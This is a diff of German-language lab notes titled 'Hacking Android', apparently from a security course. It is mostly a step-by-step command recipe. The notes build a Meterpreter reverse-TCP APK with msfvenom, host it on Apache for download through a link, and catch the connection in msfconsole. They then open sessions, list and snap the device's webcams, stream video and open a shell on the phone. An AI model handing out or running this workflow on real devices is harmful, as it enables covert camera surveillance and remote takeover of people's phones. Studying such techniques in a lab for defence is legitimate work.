@@ -1,9 +1,10 @@
-
+ 
+Protokoll - Vormittag
 ## Hacking Android
 
-Optional kann eine Textdatei mit wichtigen Daten der Kali Maschine angeleget werden.	
+Wichtig, eine Liste mit Attacker IP anlegen. 
 
-```
+
 msvenom -- help
 	=> liefert alle Parameter, die uns helfen können
 
@@ -13,10 +14,6 @@ msvenom -p android/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=444 R > /va
 	
 
 service apache2 status
-	=> Falls nicht gestartet service apache2 start
-	=> Endgerät kann nun über die IP-Adresse auf den Apache-Webserver zugreifen.
-	=> index.html im Ordner /var/www/html muss so umgeändert werden, dass man über einen Link die AndroidAPK downloaden kann.
-
 msfconsole
 
 
@@ -28,18 +25,15 @@ show options
 	=> Listet alle Options
 
 set LHOST <Attacker-IP> 
-	=> LHOST muss gesetzt werden, damit der exploit ausgeführt werden kann. 
 
 exploit
-	=> Der Exploit kann ausgeführt werden. 
-	Hierbei hatte ich einige Probleme, da die Version des Endgeräts zu alt war, um den Exploit richtig ausführen zu können.
 
 help 
 	=> Listet alle Befehle auf
 webcam_stream -h
 	=> Listet alle Options für einen specified Kommand auf.
 
-background (optional)
+background
 sessions
 
 sessions -i 1
@@ -54,23 +48,20 @@ webcam_list
 	=> Listet alle Webcams
 	=> Die Files werden auf in das Root Verzeichnis gemoved
 	=> Die Files können nun in den var/www/ Ordner kopiert werden, dass man über den Webserver Zugriff hat.
-
+	=> Falls das Kali keine Rechte hat zum streamen, muss man metasploit mit root starten. 
 
 webcam_snap
 	=> wenn mit der richtigen Session interagiert wird (physical session vom android Gerät)
 	=> Streamt eine Webcam
-
+ 
 background
 
 exploit
-	=> alle User-Interaktionen werden auf die Kali Maschine gesendet
-	=> Der Exploit wird auf der Defender-Machine ausgeführt.
+	=> alle User-Interaktionen werden auf die kali Maschine gesendet
 
 sessions -i 8
-	=> Nun kann mit der Session interagiert werden. 
 
 shell
 	=> eine Linux Shell kann jetzt auf der session ausgeführt werden
 
 Das APK-File kann zb. als Link auf einem Webserver eingebaut werden.
-```
